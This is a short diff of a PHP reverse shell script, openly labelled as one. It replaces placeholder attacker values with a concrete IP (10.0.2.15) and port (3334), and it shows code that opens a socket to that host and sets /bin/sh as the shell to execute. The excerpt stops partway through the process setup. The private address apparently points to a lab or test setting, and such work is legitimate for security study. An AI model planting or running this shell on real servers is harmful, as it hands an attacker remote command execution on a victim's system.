@@ -1,7 +1,7 @@
 <?php
 // Reverse shell - Change IP and port to match the attacker's machine
-$ip = 'YOUR_ATTACKER_IP';  // Your attacker's IP
-$port = YOUR_PORT;  // A port that your machine will listen on
+$ip = '10.0.2.15';  // Your attacker's IP
+$port = 3334;  // A port that your machine will listen on
 $sock = fsockopen($ip, $port);
 $cmd = '/bin/sh';  // Shell to execute
 $descriptorspec = array(
